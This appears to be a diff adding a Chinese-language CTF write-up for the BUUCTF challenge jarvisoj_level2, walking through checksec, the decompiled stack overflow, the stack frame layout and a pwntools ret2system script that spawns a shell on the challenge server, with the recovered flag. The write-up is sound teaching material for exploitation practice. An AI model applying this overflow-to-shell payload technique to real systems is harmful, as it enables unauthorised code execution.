@@ -787,6 +787,92 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)
+
+先`file ./level2`查看文件类型再`checksec --file=./level2`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./level2    
+./level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./level2    
+[*] '/home/tyd/ctf/pwn/buuctf/level2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数。
+
+```bash
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  system("echo 'Hello World!'");
+  return 0;
+}
+```
+
+双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+
+  system("echo Input:");
+  return read(0, buf, 0x100u);
+}
+```
+
+双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x88`个字节占满`buf`变量，再用`0x4`个字节覆盖到栈帧`r`。
+
+```assembly
+-00000088 ; D/A/*   : change type (data/ascii/array)
+-00000088 ; N       : rename
+-00000088 ; U       : undefine
+-00000088 ; Use data definition commands to create local variables and function arguments.
+-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
+-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
+-00000088 ;
+-00000088
+-00000088 buf             db 136 dup(?)
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008
++00000008 ; end of stack variables
+```
+
+在`Functions window`中可以看到有个`system()`函数，其地址可以由`elf.symbols['system']`获得。使用`ROPgadget`可得`/bin/sh`的地址为`0x804a024`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./level2 --string "/bin/sh"    
+Strings information
+============================================================
+0x : /bin/sh
+```
+
+编写`Python`代码求解，得到`flag{f0506726-1ac9-446a-8852-717784d3975d}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 28530)
+elf = ELF('./level2')
+system_addr = elf.symbols['system']
+bin_sh_addr = 0x804a024 # ROPgadget --binary ./level2 --string "/bin/sh"
+payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
+```
+
+------
+
 ### [jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)
 
 先`file ./level2_x64`查看文件类型再`checksec --file=./level2_x64`检查一下文件保护情况。
